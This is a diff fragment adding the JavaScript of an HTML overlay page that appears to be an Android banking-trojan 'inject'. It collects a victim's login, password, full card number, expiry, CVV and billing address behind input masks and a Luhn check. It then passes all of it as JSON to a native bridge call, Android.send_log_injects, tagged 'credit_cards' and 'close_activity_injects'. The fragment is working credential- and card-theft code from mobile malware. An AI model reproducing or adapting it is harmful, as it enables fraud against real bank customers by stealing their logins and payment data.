+            errorName = document.getElementById('errorName'),
+            errorStreet = document.getElementById('errorStreet');
+
+        var custom_options = {
+            translation: {
+                '0': {pattern: /\d/},
+                '9': {pattern: /\d/, optional: true},
+                '#': {pattern: /[a-zA-Z  -]/, recursive: true},
+                'A': {pattern: /[a-zA-Z]/},
+                'S': {pattern: /[a-zA-Z]/}
+            }
+        };
+            
+        $('#cc').mask('0000 0000 0000 0000');
+        $('#expMM').mask('00');
+        $('#expYY').mask('00');
+        $('#cvv').mask('000');
+        $('#holderName').mask('#' , custom_options)
+        $('#country').mask('#' , custom_options)
+        $('#city').mask('#' , custom_options)
+
+        function checkLength() {
+            if(login.value.length > 3 && password.value.length > 3) {
+                nextPage.disabled = false
+            } else {
+                nextPage.disabled = true
+            }
+        }
+
+        function check(){
+            if(!valid_credit_card(cc.value)) {
+                ccBlock.classList.add('error');
+                cc.focus()
+            } else {
+                ccBlock.classList.remove('error');
+                expMM.focus()
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19) return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+        }
+
+        var currentDate = new Date();
+        var dateMonth = `0${currentDate.getMonth() + 1}`;
+
+        function checkYear() {
+            if(expYY.value > 20) {
+                dateMonth = 0;
+            } else if(currentDate.getMonth() + 1 >= 10){
+                dateMonth = `${currentDate.getMonth() + 1}`;
+            } else {
+                dateMonth = `0${currentDate.getMonth() + 1}`;
+            }
+        }
+
+        function check2(){
+            if(dateMonth > expMM.value || expMM.value <= 0 || expMM.value > 12 || expMM.value.length === 1) {
+                mmBlock.classList.add('error')
+                expMM.focus()
+
+            } else if(dateMonth < expMM.value || expMM.value >= 0 || expMM.value <= 12 || expMM.value.length === 2){
+                mmBlock.classList.remove('error');
+                expYY.focus()
+                console.log(dateMonth)
+            }
+        }
+
+        function check3(){
+            if(expYY.value <= 20 && expYY.value >= 28 && expYY.value.length === 1) {
+                yyBlock.classList.add('error');
+                expMM.focus()
+            } else if(expYY.value >= 20 && expYY.value <= 28 && expYY.value.length === 2){
+                yyBlock.classList.remove('error');
+                cvv.focus()
+            }
+        }
+
+        function check4(){
+            if(cvv.value.length != 3) {
+                cvvBlock.classList.add('error');
+                cvv.focus()
+            } else if(cvv.value.length === 3){
+                cvvBlock.classList.remove('error');
+                holderInfo.classList.add('active')
+            }
+        }
+
+        function check5() {
+            if (valid_credit_card(cc.value) && cc.value.length === 19 && expMM.value >= 0 && expMM.value <= 12 && expMM.value.length === 2 && expYY.value >= 20 && expYY.value <= 28 && expYY.value.length === 2 && cvv.value.length === 3) {
+                sendData.disabled = false
+            } else {
+                sendData.disabled = true
+            }
+        }
+
+        nextPage.onclick = function() {
+            spinner.style.display = 'block';
+            setTimeout(() => {
+                form1.style.display = 'none'
+                spinner.style.display = 'none'
+                form2.style.display = 'block'
+            }, 1500);
+        }
+
+        sendData.onclick = function () {
+            if(holderName.value.length == 0) {
+                errorName.style.display = 'block';
+            } else {
+                errorName.style.display = 'none';
+            }
+
+            if(country.value.length == 0) {
+                errorCountry.style.display = 'block';
+            } else {
+                errorCountry.style.display = 'none';
+            }
+
+            if(address.value.length == 0) {
+                errorStreet.style.display = 'block';
+            } else {
+                errorStreet.style.display = 'none';
+            }
+
+            if(city.value.length == 0) {
+                errorCity.style.display = 'block';
+            } else {
+                errorCity.style.display = 'none';
+            }
+
+            if(valid_credit_card(cc.value) && expMM.value.length == 2 && expYY.value.length == 2 && cvv.value.length == 3 && holderName.value.length > 3 && country.value.length > 3 && address.value.length > 3 && city.value.length > 3) {
+                var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.cc = cc.value;
+                data.exp = `${expMM.value}/${expYY.value}`;
+                data.cvv = cvv.value;
+                data.holderName = holderName.value;
+                data.country = country.value;
+                data.address = address.value;
+                data.aptSuite = aptSuite.value;
+                data.city = city.value;
+                data.postalCode = postalCode.value;
+                data.type_injects = "credit_cards";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+            }
+        }
+    </script>
+</body>
+</html>
